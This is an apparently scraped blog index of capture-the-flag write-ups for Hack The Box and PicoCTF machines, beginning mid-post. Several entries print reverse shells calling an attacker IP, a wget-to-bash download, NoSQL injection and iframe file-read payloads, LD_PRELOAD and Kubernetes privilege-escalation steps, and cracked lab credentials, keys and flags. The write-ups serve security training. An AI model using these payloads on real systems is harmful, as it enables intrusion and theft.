UID=??? PID=2101 | ???2024/08/11 07:03:01 CMD: UID=0 PID=2100 | /bin/sh -c find \"/opt/gnuplot\" -name \"*.plt\" -exec gnuplot {} \\;2024/08/11 07:03:01 CMD: UID=0 PID=2095 | /bin/sh /opt/gnuplot/getdata.sh2024/08/11 07:03:01 CMD: UID=0 PID=2094 | /bin/sh -c /opt/gnuplot/getdata.sh2024/08/11 07:03:01 CMD: UID=0 PID=2109 | gnuplot /opt/gnuplot/networkplot.pltvdaisley@topology:/opt/gnuplot$ vi shell.pltShell contains gunplot command for reverse shell:cmdout = system(\"/bin/bash -c '/bin/sh -i &gt;&amp; /dev/tcp/10.10.16.2/1234 0&gt;&amp;1'\")print cmdoutThis will get executed and you will get connection on NetCat 1234port and you will be root.# cat /root/root.txt0cf48f1617c9ac05307fda9abc8d7a0b" }, { "title": "TimeLapse from HTB", "url": "/posts/Timelapse-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "TimeLapse from HTBnmapgave this:PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-18 00:31:59Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrappedThen go to smbits open on 445 portsmbclient //10.10.11.152/sharesPassword for [WORKGROUP\\giorgi]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . .. Dev HelpDeskThen download all files in that directory:cd Dev\\get Dev\\winrm_backup.zipcd HelpDesk\\get LAPS.x64.msiget LAPS_TechnicalSpecification.docxget LAPS_OperationsGuide.docxget LAPS_Datasheet.docxThen we should crack that .zipfile which needs password and we will use johnzip2john Devwinrm_backup.zip &gt;&gt; hash_Devjohn -w=/usr/share/wordlists/rockyou.txt hash_Dev-------supremelegacy (Devwinrm_backup.zip/legacyy_dev_auth.pfx)-------unzip Devwinrm_backup.zipThis will give us legacyy_dev_auth.pfx Which stores certificates and keys. We should crack it too with johnpfx2john legacyy_dev_auth.pfx &gt;&gt; legacy_hashjohn -w=/usr/share/wordlists/rockyou.txt legacy_hash-------thuglegacy (legacyy_dev_auth.pfx)-------Then extract certificates like this. Enter password all times when it asks you toopenssl pkcs12 -in legacyy_dev_auth.pfxVerifying - Enter PEM pass phrase:-----BEGIN ENCRYPTED PRIVATE KEY-----MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQ2i/vfK4gBZ8MUojRpEjXMwICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEJ6w6RVwQM/ipW/Ae//0LdIEggTQh/f5BKbRecUFOLCNdtQzS91q7QMzs3NjJWMcKfAu7DBQHWrYLN/YZp1C24Ts0OQ/FwM1YtQRyNtSLu/30fS+0bI6T+yadanpAsTJ2aHiYrI4MP3rx/xxyijA92IPcUWA8KveLNHdw3ZlMvJMq/hPh62jHUNzt8UuMzEuGHfNlwWiJC3Ry/SbdMewTsJ+OguwYw37CqQAjOErAgad8mk/LJyZxS0B9H5hivwh6z5dS77nMSInJ8uymlnjbv8BPZFYn4V4tveCO/7w4gigttXSHZscM1lvmu7zvm12KrCjcledOti6gDrLbkJMDTOvXtH6IPvNXu1SX7N3wwmW7ah2ZIIjtXIidHAmFL1thyFN4c0xnH/PbqOXOVS4JRr0iK2GZYiAzNfmx2mc8vhr3vuveRRcUhBbkU/cQ1Ubtp7EFYXhBvbTGATtcThPFTVWFEhRE41Xvz+fXyIoQgmMHt9BzEF/YdIFOEJat7VEPM+OIN0gPhS6R531d+XGM+/gw2XY8Z2fJ96ZDC/5eIOafrQLetdPlQil2LewtqqrmMv8RYE9hNqHYsBEOGtZuG5FQ4Mwspf/81MmJDtiple0H9QOgYjV2rgPlsEt1uvCw/aBq0urqupBjQ/yA9bNEza7d92ZDu0F41wLm5eI81ixSv7+n4eWONkTO3iuissRgR1rb06ak5/wVJmZoNC+u0gb+wC2+QWbGIofTzLegY8B2lnrLOFjASnNmwRqUJ5B8luO1YRhDBZFhsS29QBFRpWUIVSm7LmFwtL1zgkJTql0KXYdDrIkmLmYvPFfdqn+8T2KX03dQwQxsvVb6bDm/mgXJeQc2rK5sEB4T/rzGFABLq52PBA+H8ZyNhPTJa2nk66kVeAqtik0cebcKxdpMyrYh/XUB4x+Gy04SNXv/R6rYAHPaV1pZxgsTBWQeod5nGOi5tMMO8eU5nahcTjbpFm3Rp0nieGlFCmUMvY4aMAA7s5nS8kKfKO7HIHK4BpQtzg/Cm7BWOfujpYSzR6EQXAb0Dpa9jCT8C26j1ucXLjmWSpsuYeEgZrWGc+5w/aHdR6SAQ1GdsiSBs0v7xD8+P9jCs0gQz1FhovB/ZTzKot35R1QnL+ij3zNGubqpr/nz3mMp3i7pAI9rGm3bJSv4uzcHoBKRfY+OqyuAOmwXvT2SeStt7Le6ApaFmkaGLEpfGsyWWqG8HUbhxodohgrFvqIVpplLR5SnI1U1oty3d3EwUBPKtbqbPf5xBLm9AQ+nE1+spHZ21iofm/ylPjnWNAXkGdjsMxgHW2KdEm28Q4AF4/4YINku0/LW3Zy2SkA3H2m/TJsAy3wUhaX2pGutijsnPE8vHbYsFQK09oNbDNvPPO5Utyhg2k0OCPBcGOScKupmjxljmZVGrzy1/m5+nidot73wCwBHzWvGwDcjkTpiTzacvMfX2QtCqTrwqAU97xxcb98WnZ26RgOHeiiO0gYY28+SzypPi3BV3RDIh9ag+jVpvgh591xVY+cQYeGJRUEuawCy+JfrCGevI5T8xha/rWbz8VX4EM4QsIUd+QchaRyty7oROzMmG+cwGhlm7kb2HUAv7F0tgtQaBhe4YbSGHDO29DZSSIZ5K33K637OHy3n5OH1/tZJIJvtVOAS3nMiDw=-----END ENCRYPTED PRIVATE KEY----------BEGIN CERTIFICATE-----MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADASMRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og00E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAbYX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcsyOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AXDBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYerC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqam966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F03KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txGhqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbhnx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA-----END CERTIFICATE-----We’ll need this to connect to this machine with evil-winrmPorts of winrm are open if you tell nmap to list all open portsThen save this key and certificate like this:openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodesopenssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.certThen connect:evil-winrm -S -i 10.10.11.152 -c key.cert -k key.pemUser flag is in C:\\Users\\legacyy\\Desktop&gt;**User Flag is: 9f1d2a28bbb23052353dbe901d498486**Now you need to find another userscredentialsC:\\Users\\legacyy\\APPDATA\\Roaming\\microsoft\\windows\\powershell\\psreadline&gt; cat ConsoleHost_history.txtwhoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}get-aduser -filter * -properties * Username —- svc_deployPassword —- E3R$Q62^12p7PLlC%KWaxuaVexit the connection and then connect as svc_deployThen read things about younet user svc_deploy------------------------Local Group Memberships *Remote Management UseGlobal Group memberships *LAPS_Readers *Domain UsersWith LAPS_Readersyou can read passwords of users.Then with this command you can find password for AdministratorGet-ADComputer -Filter 'ObjectClass -eq \"computer\"' -Property *---------------------------ms-Mcs-AdmPwd : 7AP18$Q3+(.%58O9D-&amp;4M}x#----------------------------------------Exit the connection and connect as administratorevil-winrm -S -i 10.10.11.152 -p '7AP18$Q3+(.%58O9D-&amp;4M}x#' -u 'Administrator'Root flag is in C:\\users\\trx\\desktop**Root Flag is: 64372544d029b29754146e6cc55883c9**Fck Windows &lt;3" }, { "title": "surveillance from HTB", "url": "/posts/Surveillance/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "surveillance from HTBnmapshowed nothing unusual.add this to /etc/hosts10.10.11.245 surveillance.htbThen access the site. At the end of the site there is a version which is site running on.There is an exploit on that which i found inhttps://github.com/0xfalafel/CraftCMS_CVE-2023-41892I executed it and got cmdpython3 craftCms_4.4.14.py http://surveillance.htb/Then i created reverse.shfor reverse shelland uploaded it, then executedwget http://10.10.16.6:8000/reverse.sh|bashbash reverse.shI got connection on netcatrlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.6] from (UNKNOWN) [10.10.11.245] 52290www-data@surveillance:/$ script /dev/null -c bashwww-data@surveillance:/$ cd /var/www/html/craft/storage/backups/unzipthe sqlfileThen read it and with word search find userwww-data@surveillance:~/html/craft/storage/backups$ cat surveillance--2023-10-17-202801--v4.4.14.sql-----------------------------------------------------INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');/*!40000 ALTER TABLE `users` ENABLE KEYS */;There is the password for matthew—- 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ecWith hashidi found out that it’s sha512and i cracked it with hashcathashcat -m 1400 hash /usr/share/wordlists/rockyou.txt-----------------39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490Then went and connected to ssh matthew@10.10.11.245 With password**User Flag is: 9acc62906a3ec24021f196fcf1abc4be**sudo -lshowed nothing, we have to become other user.with ss -tlnpi got that there is an 8080port running internallyss -tlnpLISTEN 0 511 127.0.0.1:8080 0.0.0.0:*Then i did port forwarding ssh matthew@surveillance.htb -L 8082:127.0.0.1:8080Accessed it with 127.0.0.1:8082Logged as admin -- starcraft122490Then found that zoneminder v1.36.32There is an exploit on that.https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.pyI ran that exploit with this:python3 exploit.py -t &lt;target_url&gt; -ip &lt;attacker-ip&gt; -p &lt;port&gt;And i got connection on netcati became zoneminder but i didn’t know password so i couldn’t find out what i can do with root permissionSo generate sshkeys and connect to sshzoneminder@surveillance:~$ ssh-keygen----------------------------------Your identification has been saved in ./ssh-keyYour public key has been saved in ./ssh-key.pubSave ssh-keyto your machine and chmod 600 ssh-keymove ssh-key.pubto ~/.ssh/authorized_keys echo 'ssh-rsa AAAAB3NzaC1yc..............' &gt; ~/.ssh/authorized_keysI found out what i can dozoneminder@surveillance:~$ sudo -lUser zoneminder may run the following commands on surveillance: (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *On the site i forwarded in options &gt; configi found LD_PRELOADwhich uses  zmdc.pl file.We can create an file which is preloaded as server starts. THERE add the file directory which should be preloaded for me it is /tmp/helpand click savecreate an .cfile#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void _init() { unsetenv(\"LD_PRELOAD\");\tsystem(\"chmod u+s /bin/bash\");}thengcc -shared main.c -o help -nostartfilesThensudo zmdc.pl startup zmdcAnd if you did everything correct you can become root withbash -pRoot Flag is: 7699ad0bd39de4f6886b2f3c46092ad9***" }, { "title": "Stonks from PicoCTF", "url": "/posts/Stonks-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Stonks from PicoCTFpage DescriptionI decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn’t believe you if you told me it’s unsecure! vuln.c nc mercury.picoctf.net 53437 HintsOkay, maybe I’d believe you if you find my API key.Lets download and learn how “vuln.c” program works.From Hints we know that for program to malfunction we need to mess with the API KEY.Code we need to learn about is :char *user_buf = malloc(300 + 1);\tprintf(\"What is your API token?\\n\");\tscanf(\"%300s\", user_buf);\tprintf(\"Buying stonks with token:\\n\");\tprintf(user_buf);To be exact this line:scanf(\"%300s\", user_buf);Explaining to how to mess with this is in this video : https://youtu.be/2gnaG4ocGLA?si=lRT9IVrB2gRvZDEL&amp;t=332 %xIn C, %x is a format specifier used in the printf function to print an unsigned integer in hexadecimal format using lowercase letters.We need to use this.So let’s connect to NetCat and Enter this into API key. We need to Enter lots of %x to provide almost all of the unsigned integers to find the flag. Just know that Flag will be in Hex.$ nc mercury.picoctf.net 53437Welcome back to the trading app!What would you like to do?1) Buy some stonks!2) View my portfolio1Using patented AI algorithms to buy stonksStonks chosenWhat is your API token?%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xBuying stonks with token:897d410804b00080489c3f7f49d80ffffffff1897b160f7f57110f7f49dc70897c1801897d3f0897d4106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3463646261653532ffed007df7f84af8f7f57440cc5b750010f7de6ce9f7f580c0f7f495c0f7f49000ffedf8a8f7dd768df7f495c08048ecaffedf8b40f7f6bf09804b000f7f49000f7f49e20ffedf8e8f7f71d50f7f4a890cc5b7500f7f49000804b000ffedf8e88048c86897b160ffedf8d4ffedf8e88048be9f7f493fc0ffedf99cffedf99411897b160cc5b7500ffedf90000f7d8cfa1f7f49000f7f490000f7d8cfa11ffedf994ffedf99cffedf92410f7f49000f7f6c70af7f840000f7f49000002c228847464e4e57000180486300f7f71d50f7f6c960804b00018048630080486628048b85Portfolio as of Sat Jul 13 11:36:27 UTC 20241 shares of HDAG1 shares of V5 shares of ZWGM21 shares of FR28 shares of DTR47 shares of RQT85 shares of D504 shares of OKWD787 shares of NNPAGoodbye! Helpful tip if you dont want to type that many “%x” by hand go do this:$ python3Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linuxType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; \"%x\" * 100'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x'So our Hex is this :897d410804b00080489c3f7f49d80ffffffff1897b160f7f57110f7f49dc70897c1801897d3f0897d4106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3463646261653532ffed007df7f84af8f7f57440cc5b750010f7de6ce9f7f580c0f7f495c0f7f49000ffedf8a8f7dd768df7f495c08048ecaffedf8b40f7f6bf09804b000f7f49000f7f49e20ffedf8e8f7f71d50f7f4a890cc5b7500f7f49000804b000ffedf8e88048c86897b160ffedf8d4ffedf8e88048be9f7f493fc0ffedf99cffedf99411897b160cc5b7500ffedf90000f7d8cfa1f7f49000f7f490000f7d8cfa11ffedf994ffedf99cffedf92410f7f49000f7f6c70af7f840000f7f49000002c228847464e4e57000180486300f7f71d50f7f6c960804b00018048630080486628048b85Let’s go to CyberChef and enter out Hex into it.We get Something uglyIf you look at it you can see the inverted flag:ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿí}After examining the flag We can tell that flag is divided into 4 letter blocks and reversed.If we divide it into blocks with 4 letters and reverse it we get this:ocip {FTC 0l_I 4_t5 m_ll 0m_y _y3n 4cdb ae52 }picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}Flag is this:picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}***" }, { "title": "Stocker from HTB", "url": "/posts/Stocker-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Stocker from HTBnmapgave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)| 256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)|_ 256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-generator: Eleventy v2.0.0|_http-title: Stock - Coming Soon!|_http-server-header: nginx/1.18.0 (Ubuntu)Add the site to /etc/hosts:10.10.11.196 stocker.htbAccess the site and there is nothing.Start directory and subdomain enumeration. And in subdomain enumeration you will find devsubdomain:ffuf -u http://stocker.htb -H \"Host: FUZZ.stocker.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 178------------------------------devAdd it to /etc/hosts10.10.11.196 dev.stocker.htbIt’s a login page. We have to perform nosql injection. Fire up BurpSuiteTurn on Interceptand click login. And this is the payload.-------------------Content-Type: application/json------------------------{ \"username\":{ \"$ne\":\"null\" }, \"password\":{ \"$ne\":\"null\" }}Forwardit and you will get logged in.Press add cart, turn Intercepton and then click Purchase. You will need to modify one item like this:{\"basket\":[{\"_id\":\"638f116eeb060210cbd83a8d\",\"title\":\"Cup\",\"description\":\"It's a red cup.\",\"image\":\"red-cup.jpg\",\"price\":32,\"currentStock\":4,\"__v\":0,\"amount\":2}]}Basically add&lt;iframe src='file:///etc/passwd' width='1000' height='1000'&gt;&lt;/iframe&gt;This will read /etc/passwdThen view purchase order hereand read the /etc/passwd. Remember angoosewho is an user in the system.Then add this payload:&lt;iframe src='file:///var/www/dev/index.js' width='1000' height='1000'&gt;&lt;/iframe&gt;Read it and you will get the password for angoose. Username angoosePassword IHeardPassphrasesArePrettySecureConnect to ssh angoose@stocker.htb with password.**User Flag is: 8a8f71de1bb72eddb879ad9010ed6790**angoose@stocker:~$ sudo -l[sudo] password for angoose:Matching Defaults entries for angoose on stocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser angoose may run the following commands on stocker: (ALL) /usr/bin/node /usr/local/scripts/*.jsThis means we have to create an .jsfile which will spawn an bash shell. But we do not have an write permission in that directory. As *means every string we can use that.Basically *is also equal to ../../../tmp/shell.jsor whatever you want.Create an shell.jswith this inside:const { spawn } = require('child_process');// Spawning an interactive Bash shellspawn('/bin/bash', { stdio: [0, 1, 2] });Then run it and become the root: sudo /usr/bin/node /usr/local/scripts/../../../tmp/shell.jsroot@stocker:/tmp#Root Flag is: c735f1974f3988b1cd17a115179d74ef***" }, { "title": "SteamCloud from HTB", "url": "/posts/SteamCloud-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "SteamCloud from HTBnmapgave thisPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)| 256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)|_ 256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)2379/tcp open ssl/etcd-client?| tls-alpn:|_ h2| ssl-cert: Subject: commonName=steamcloud| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1| Not valid before: 2024-08-17T21:22:42|_Not valid after: 2025-08-17T21:22:42|_ssl-date: TLS randomness does not represent time2380/tcp open ssl/etcd-server?| ssl-cert: Subject: commonName=steamcloud| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1| Not valid before: 2024-08-17T21:22:42|_Not valid after: 2025-08-17T21:22:43| tls-alpn:|_ h2|_ssl-date: TLS randomness does not represent time8443/tcp open ssl/https-alt| tls-alpn:| h2|_ http/1.1| fingerprint-strings:| FourOhFourRequest:| HTTP/1.0 403 Forbidden| Audit-Id: b801c3c4-fb92-45c9-a786-1a3196551e3f| Cache-Control: no-cache, private| Content-Type: application/json| X-Content-Type-Options: nosniff| X-Kubernetes-Pf-Flowschema-Uid: 182bbb32-c502-4451-a14f-cc7dbe305194| X-Kubernetes-Pf-Prioritylevel-Uid: f4de25b0-df3f-4fc5-a742-ddf7350d87a1| Date: Sat, 17 Aug 2024 21:26:15 GMT| Content-Length: 212| {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}| GetRequest:| HTTP/1.0 403 Forbidden| Audit-Id: cf0421c6-ba98-4e3d-8f1d-fb852c5b7f57| Cache-Control: no-cache, private| Content-Type: application/json| X-Content-Type-Options: nosniff| X-Kubernetes-Pf-Flowschema-Uid: 182bbb32-c502-4451-a14f-cc7dbe305194| X-Kubernetes-Pf-Prioritylevel-Uid: f4de25b0-df3f-4fc5-a742-ddf7350d87a1| Date: Sat, 17 Aug 2024 21:26:12 GMT| Content-Length: 185| {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}| HTTPOptions:| HTTP/1.0 403 Forbidden| Audit-Id: be215632-cb1d-4164-8f9c-bab1b334f1eb| Cache-Control: no-cache, private| Content-Type: application/json| X-Content-Type-Options: nosniff| X-Kubernetes-Pf-Flowschema-Uid: 182bbb32-c502-4451-a14f-cc7dbe305194| X-Kubernetes-Pf-Prioritylevel-Uid: f4de25b0-df3f-4fc5-a742-ddf7350d87a1| Date: Sat, 17 Aug 2024 21:26:13 GMT| Content-Length: 189|_ {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot options path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=minikube/organizationName=system:masters| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1| Not valid before: 2024-08-16T21:22:41|_Not valid after: 2027-08-17T21:22:41|_http-title: Site doesn't have a title (application/json).10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Site doesn't have a title (text/plain; charset=utf-8).10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)| tls-alpn:| h2|_ http/1.1|_ssl-date: TLS randomness does not represent time|_http-title: Site doesn't have a title (text/plain; charset=utf-8).| ssl-cert: Subject: commonName=steamcloud@1723929764| Subject Alternative Name: DNS:steamcloud| Not valid before: 2024-08-17T20:22:44|_Not valid after: 2025-08-17T20:22:4410256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Site doesn't have a title (text/plain; charset=utf-8).Reading all this we get that site is running kubernetesand to explore that we’ll needhttps://github.com/cyberark/kubeletctlsudo wget https://github.com/cyberark/kubeletctl/releases/download/v1.12/kubeletctl_linux_amd64 &amp;&amp; chmod a+x ./kubeletctl_linux_amd64 &amp;&amp; mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctlThen start exploring.kubeletctl --server 10.10.11.133 podsWith this you will list all podsthere is.We’ll need├───┼────────────────────────────────────┼─────────────┼─────────────────────────│ 5 │ nginx │ default │ nginx├───┼────────────────────────────────────┼─────────────┼─────────────────────────Then check where we can do RCEin those podskubeletctl scan rce --server 10.10.11.133├───┼──────────────┼────────────────────────────────────┼─────────────┼────────│ 5 │ │ nginx │ default │ nginx | +├───┼──────────────┼────────────────────────────────────┼─────────────┼──────We can do RCEin nginxkubeletctl exec \"id\" -p nginx -c nginx --server 10.10.11.133uid=0(root) gid=0(root) groups=0(root)We are rootthat’s good.User Flag is in /rootkubeletctl exec \"ls /root\" -p nginx -c nginx --server 10.10.11.133user.txtUser Flag is: c9469d2a6de00e610e724285bf6935e0***we’ll need tokens so let’s grab it:kubeletctl exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" -p nginx -c nginx --server 10.10.11.133kubeletctl exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\" -p nginx -c nginx --server 10.10.11.133Save the ca.crtas fileand tokenas variableexport token=\"eyJhbGciOiJSUzI1NiIsImtpZCI6............\"Then use kubectlto list directories with certificateskubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11.133:8443 get podsNAME READY STATUS RESTARTS AGEnginx 1/1 Running 0 33mThen what can we do, what permissions do we have:kubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11.133:8443 auth can-i --listResources Non-Resource URLs Resource Names Verbsselfsubjectaccessreviews.authorization.k8s.io [] [] [create]selfsubjectrulesreviews.authorization.k8s.io [] [] [create]pods [] [] [get create list]This means we can do all things in defaultnamespaceNow we have to make an podCreate file named &lt;whatYouWant&gt;.yamlapiVersion: v1kind: Podmetadata: name: nginxt namespace: defaultspec: containers: - name: nginxt image: nginx:1.14.2 volumeMounts: - mountPath: /root name: mount-root-into-mnt volumes: - name: mount-root-into-mnt hostPath: path: / automountServiceAccountToken: true hostNetwork: trueThen upload it like this:kubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11.133:8443 apply -f &lt;name&gt;.yamlThen use that uploaded namespace to get Root Flag`kubeletctl exec \"cat /root/root/root.txt\" -p nginxt -c nginxt --server 10.10.11.133" }, { "title": "Static-ain't-always-noise from PicoCTF", "url": "/posts/Static-ain't-always-noise-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Static-ain’t-always-noise from PicoCTFpage [DescriptionCan you look at the data in this binary: static? This BASH script might help!Just know we don’t need this “BASH script”. Download “static” and use strings on it.giorgi@darkfears31:~/Desktop/picoctf$ strings static /lib64/ld-linux-x86-64.so.2libc.so.6puts__cxa_finalize__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableAWAVIAUATL[]A\\A]A^A_Oh hai! Wait what? A flag? Yes, it's around here somewhere!;*3$\"picoCTF{d15a5m_t34s3r_1e6a7731}GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 